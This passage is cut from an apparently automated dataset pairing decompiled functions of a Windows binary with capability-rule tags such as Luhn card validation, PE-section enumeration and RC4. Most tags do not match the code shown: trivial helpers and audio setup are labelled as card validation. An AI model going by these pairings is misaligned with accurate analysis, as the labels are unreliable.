        "decompiled_code": "\nvoid __fastcall fcn.00461a20(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack28 = 0x461a3b;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack32 = 0x461ae7;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x461abb;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h = &fcn.00461a20::var_8h;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040ef4c(arg_8h, *0x461af8);\n    fcn.004055c8();\n    sub.user32.dll_ShowWindow();\n    sub.user32.dll_SetForegroundWindow();\n    iVar2 = 1;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if (iVar1 < iVar2) break;\n        fcn.0046196c();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = arg_8h;\n    iStack48 = 0x461aee;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 416
    },
    "00461ef4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461ef4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x461fe7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x461f1d;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar1;\n    uStack36 = 0x461fc7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00461c98();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x461fd1;\n    uStack36 = 0x461f51;\n    iVar2 = (**(**(in_EAX + 0x4c) + 0x14))();\n    if (iVar2 < 1) {\n        uStack36 = 0x461f65;\n        (**(**(in_EAX + 0x4c) + 0x38))();\n    }\n    uStack36 = 0x461f73;\n    iVar2 = fcn.0041f9e0();\n    *(iVar2 + 0xf) = 1;\n    uStack36 = 0x461f82;\n    fcn.0041fbec();\n    uStack36 = 0x461f8f;\n    fcn.00489d00();\n    uStack36 = 0x461f9d;\n    (**(**(in_EAX + 0x4c) + 0x1c))();\n    uStack36 = 0x461fa7;\n    fcn.00489cb0();\n    uStack36 = 0x461fb4;\n    fcn.00489cfc();\n    uStack36 = 0x461fbb;\n    fcn.0041fe9c();\n    uStack36 = 0x461fc6;\n    fcn.0040f94c();\n    return;\n}\n",
        "token_count": 546
    },
    "00462164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00462164(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 144
    },
    "00463a24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463a24(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint var_90h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack164 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack168 = 0x463aed;\n    uStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    if ((-1 < param_2) && (iVar2 = fcn.0040676c(),  param_2 < iVar2)) {\n        uVar1 = *(*(in_EAX + 0x50) + 0xc + param_2 * 0x18);\n        (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n        uVar3 = fcn.00463734();\n        if ((uVar3 & 0x80000000) == 0) {\n            var_ch = 0;\n            var_10h = 0;\n            (**(*var_4h + 0x14))(var_4h, &fcn.00463a24::var_ch, &fcn.00463a24::var_10h);\n            uVar3 = (**(*var_4h + 0x18))(var_4h, uVar1, &fcn.00463a24::var_8h, &fcn.00463a24::var_90h);\n            if ((uVar3 & 0x80000000) == 0) {\n                (**(*var_4h + 0xc))(var_4h, var_8h);\n            }\n        }\n        (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n    }\n    *in_FS_OFFSET = uStack172;\n    puStack164 = 0x463af4;\n    uStack168 = 0x463aec;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 519
    },
    "00463b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463b00(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_EDX;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack1332;\n    uint uStack1328;\n    uchar *puStack1324;\n    uint var_518h;\n    uint var_4c0h;\n    uint var_48ch;\n    uint32_t var_488h;\n    uint var_480h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    puStack1324 = 0x463b26;\n    fcn.00405fe8();\n    uStack1328 = 0x463c38;\n    piStack1332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffacc;\n    *in_EDX = 0;\n    *var_50h = 0;\n    puStack1324 = &stack0xfffffffc;\n    (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n    (**(**(in_EAX + 0x38) + 0x10))(*(in_EAX + 0x38));\n    iVar3 = fcn.00463734();\n    if (iVar3 == 0) {\n        (**(*var_4h + 0x10))(var_4h, &fcn.00463b00::var_54h);\n        fcn.00406208();\n        cVar2 = fcn.00462840();\n        if (cVar2 != '\\0') {\n            fcn.00403af4();\n            puVar4 = *(var_54h + 0x44);\n            puVar5 = &fcn.00463b00::var_518h;\n            for (iVar3 = 0x16; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            fcn.004030fc();\n            *in_EDX = var_48ch;\n            *var_50h = (var_488h ^ var_488h >> 0x1f) - (var_488h >> 0x1f);\n            *arg_8h = var_480h;\n        }\n    }\n    (**(**(in_EAX + 0x38) + 0x18))(*(in_EAX + 0x38), 0, 0);\n    piVar1 = *(in_EAX + 0xc);\n    (**(*piVar1 + 0x1c))();\n    *in_FS_OFFSET = piVar1;\n    fcn.004060ac(0x463c3f);\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 697
    },
    "00463c74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463c74(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_5h;\n    \n    puStack28 = 0x463c82;\n    iVar1 = fcn.00404a1c();\n    uStack32 = 0x463d07;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack40 = 0x463ca0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00463700();\n    piStack40 = *(iVar1 + 0xc);\n    piStack44 = 0x463cac;\n    (**(*piStack40 + 0x24))();\n    piStack44 = *(iVar1 + 0x38);\n    piStack48 = 0x463cb8;\n    (**(*piStack44 + 0x10))();\n    piStack48 = 0x463cc0;\n    fcn.00463688();\n    piStack48 = 0x463cc8;\n    fcn.004636a0();\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x463d0e;\n    piStack44 = 0x463cfc;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piStack40 = &stack0xfffffffc;\n    fcn.00404640();\n    *in_FS_OFFSET = piStack48;\n    return;\n}\n",
        "token_count": 383
    },
    "00464110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00464110(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00464028();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 127
    },
    "004641c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004641c0(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4641d8;\n    fcn.0042eddc();\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    puStack24 = 0x4641ee;\n    fcn.00405530();\n    if (*(in_EAX + 4) != 0) {\n        uStack28 = 0x46421d;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00404650();\n        *(in_EAX + 4) = 0;\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x46422f;\n        fcn.00463fa8();\n        *(in_EAX + 9) = 0;\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00464d68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00464d68(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *0x49af44 = fcn.00464110();\n    fcn.00464c8c();\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 5) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 183
    },
    "00464f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00464f20(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x46500a;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x464f4e;\n    piVar1 = fcn.00404620();\n    puStack52 = 0x464f5d;\n    fcn.00464110();\n    uStack56 = 0x464fe5;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.004641b0();\n    fcn.00405530();\n    iVar2 = (**(*piVar1 + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            (**(*piVar1 + 0xc))(0);\n            uStack56 = 0;\n            uStack60 = 0x465020;\n            fcn.004058e0();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405584();\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x464fec;\n    uStack56 = 0x464fdc;\n    fcn.00404650();\n    uStack56 = 0x464fe4;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 428
    },
    "0046520c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046520c(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + arg_8h;\n    return;\n}\n",
        "token_count": 54
    },
    "0046523c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046523c(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return in_EAX + arg_8h;\n}\n",
        "token_count": 98
    },
    "00465280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00465280(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return param_2 + in_EAX;\n}\n",
        "token_count": 96
    },
    "004652d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004652d8(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.004652d0();\n    return CONCAT44(CARRY4(arg_8h, uVar1) + CARRY4(*(arg_8h + 0x14), arg_8h + uVar1), *(arg_8h + 0x14) + arg_8h + uVar1)\n    ;\n}\n",
        "token_count": 106
    },
    "0046587c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046587c(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint lpflOldProtect;\n    int32_t var_4h;\n    \n    var_4h = fcn.004652d8(*arg_8h);\n    uVar4 = *(*arg_8h + 6);\n    if (-1 < uVar4 - 1) {\n        do {\n            if ((*(var_4h + 0x27) & 2) == 0) {\n                uVar2 = fcn.00465804(*(var_4h + 0x24));\n                uVar1 = *(var_4h + 0x24);\n                if ((uVar1 & 0x4000000) != 0) {\n                    uVar2 = uVar2 | 0x200;\n                }\n                iVar3 = *(var_4h + 0x10);\n                if (iVar3 == 0) {\n                    if ((uVar1 & 0x40) == 0) {\n                        if ((uVar1 & 0x80) != 0) {\n                            iVar3 = *(*arg_8h + 0x24);\n                        }\n                    }\n                    else {\n                        iVar3 = *(*arg_8h + 0x20);\n                    }\n                    if ((iVar3 != 0) &&\n                       (iVar3 = sub.kernel32.dll_VirtualProtect(*(var_4h + 8), *(var_4h + 0x10), uVar2, &lpflOldProtect)\n                       ,  iVar3 == 0)) {\n                        fcn.00405584();\n                        return;\n                    }\n                }\n                fcn.0046520c(0x28, 0);\n            }\n            else {\n                sub.kernel32.dll_VirtualFree_1(*(var_4h + 8), *(var_4h + 0x10), 0x4000);\n                fcn.00465224(0x28, 0);\n            }\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    return;\n}\n",
        "token_count": 492
    },
    "00466080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00466080(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4660b1;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49af48 = *0x49af48 + 1;\n    if (*0x49af48 == 0) {\n        fcn.00405530();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 138
    },
    "0046618c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046618c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.004661f0();\n    }\n    iVar1 = fcn.004661f4();\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0046626c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046626c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.004661f0();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f34();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "004662a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004662a4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.004661f0();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.0046626c();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403af4();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.0046618c();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 246
    },
    "00466458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00466458(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0x104) = 0;\n    fcn.004666c8();\n    *(in_EAX + 0x15c) = 1;\n    *(in_EAX + 0x15e) = 1;\n    *(in_EAX + 0x160) = 0x5622;\n    *(in_EAX + 0x164) = 0x5622;\n    *(in_EAX + 0x168) = 1;\n    *(in_EAX + 0x16a) = 8;\n    *(in_EAX + 0x16c) = 0x81;\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1df) = 1;\n    *(in_EAX + 0x1e1) = 0x5622;\n    *(in_EAX + 0x1e5) = 0x5622;\n    *(in_EAX + 0x1e9) = 1;\n    *(in_EAX + 0x1eb) = 8;\n    *(in_EAX + 0x1ed) = 0x81;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 395
    },
    "00466534": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466534(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(arg_8h + -4);\n    *(iVar1 + 0x108) = 0x54;\n    *(iVar1 + 0x10c) = 0;\n    *(iVar1 + 0x110) = 0;\n    *(iVar1 + 0x114) = *(*(arg_8h + -4) + 0xf0);\n    *(iVar1 + 0x118) = *(*(arg_8h + -4) + 0xf8);\n    *(iVar1 + 0x11c) = 0;\n    *(iVar1 + 0x120) = 0;\n    *(iVar1 + 0x124) = *(*(arg_8h + -4) + 0xf4);\n    *(iVar1 + 0x128) = *(*(arg_8h + -4) + 0xfc);\n    *(iVar1 + 300) = 0;\n    *(iVar1 + 0x130) = 0;\n    return;\n}\n",
        "token_count": 251
    },
    "004665a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004665a4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_4h;\n    \n    *(in_EAX + 0x100) = 1;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    iStack40 = in_EAX + 0x1dd;\n    iStack44 = in_EAX + 0x15c;\n    uStack48 = 0;\n    iStack52 = in_EAX + 0x104;\n    uStack56 = 0x4665e2;\n    sub.msacm32.dll_acmStreamOpen();\n    uStack56 = 0;\n    iStack60 = in_EAX + 0xfc;\n    uStack64 = *(in_EAX + 0xf8);\n    uStack68 = *(in_EAX + 0x104);\n    puStack72 = 0x466606;\n    sub.msacm32.dll_acmStreamSize();\n    puStack72 = 0x466614;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 0xf0) = uVar1;\n    puStack72 = 0x46662b;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 0xf4) = uVar1;\n    uStack76 = 0x46666d;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.00466534(&stack0xfffffffc);\n    uVar1 = *(in_EAX + 0x104);\n    sub.msacm32.dll_acmStreamPrepareHeader(uVar1, in_EAX + 0x108, 0);\n    *in_FS_OFFSET = uVar1;\n    *(in_EAX + 0xec) = 1;\n    return;\n}\n",
        "token_count": 549
    },
    "0046673c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046673c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 67
    },
    "004668ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004668ec(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 0xc) = 0x2000;\n    *(in_EAX + 0x94) = 0;\n    uVar2 = 0x466b50;\n    uVar1 = fcn.00466810(0x466b50, in_EAX);\n    *(in_EAX + 0x98) = uVar1;\n    *(in_EAX + 0x91) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 273
    },
    "00468724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00468724(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = *(in_EAX + 0x28) * 2;\n    *(*(in_EAX + 0x40) + -2 + *(in_EAX + 0x48) * 2) = 0;\n    fcn.00467644(*(in_EAX + 0x40), 0, (*(in_EAX + 0x48) + -1) * 2);\n    *(in_EAX + 0x7c) = *(*(in_EAX + 0x80) * 0xc + 0x493b22);\n    *(in_EAX + 0x88) = *(*(in_EAX + 0x80) * 0xc + 0x493b20);\n    *(in_EAX + 0x8c) = *(*(in_EAX + 0x80) * 0xc + 0x493b24);\n    *(in_EAX + 0x78) = *(*(in_EAX + 0x80) * 0xc + 0x493b26);\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x70) = 0;\n    *(in_EAX + 0x74) = 2;\n    *(in_EAX + 0x5c) = 2;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 368
    },
    "0046b228": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046b228(void)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    puVar1 = in_EAX + 0x90;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x11e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0x984;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x1e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0xa78;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x13);\n    *(in_EAX + 0x490) = 1;\n    *(in_EAX + 0x16a8) = 0;\n    *(in_EAX + 0x16a4) = 0;\n    *(in_EAX + 0x16ac) = 0;\n    *(in_EAX + 0x169c) = 0;\n    return;\n}\n",
        "token_count": 323
    },
    "0046b294": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b294(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t iStack24;\n    \n    iVar5 = *(in_EAX + 0xb58 + param_1 * 4);\n    puVar1 = param_2 + iVar5 * 4;\n    iStack24 = param_1;\n    while (iVar7 = iStack24 * 2,  iVar7 <= *(in_EAX + 0x144c)) {\n        if ((iVar7 < *(in_EAX + 0x144c)) &&\n           ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) < *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) ||\n            ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) == *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) &&\n             (uVar3 = *(in_EAX + 0x1454 + *(in_EAX + 0xb5c + iStack24 * 8)), \n             puVar2 = in_EAX + 0x1454 + *(in_EAX + 0xb58 + iStack24 * 8),  uVar3 < *puVar2 || uVar3 == *puVar2)))))) {\n            iVar7 = iVar7 + 1;\n        }\n        uVar4 = *(param_2 + *(in_EAX + 0xb58 + iVar7 * 4) * 4);\n        if ((*puVar1 <= uVar4 && uVar4 != *puVar1) ||\n           ((iVar6 = *(in_EAX + 0xb58 + iVar7 * 4),  *(param_2 + iVar6 * 4) == *puVar1 &&\n            (uVar3 = *(in_EAX + 0x1454 + iVar5),  puVar2 = in_EAX + 0x1454 + iVar6,  uVar3 < *puVar2 || uVar3 == *puVar2\n            )))) break;\n        *(in_EAX + 0xb58 + iStack24 * 4) = *(in_EAX + 0xb58 + iVar7 * 4);\n        iStack24 = iVar7;\n    }\n    *(in_EAX + 0xb58 + iStack24 * 4) = iVar5;\n    return;\n}\n",
        "token_count": 628
    },
    "0046b588": {
        "rules": [
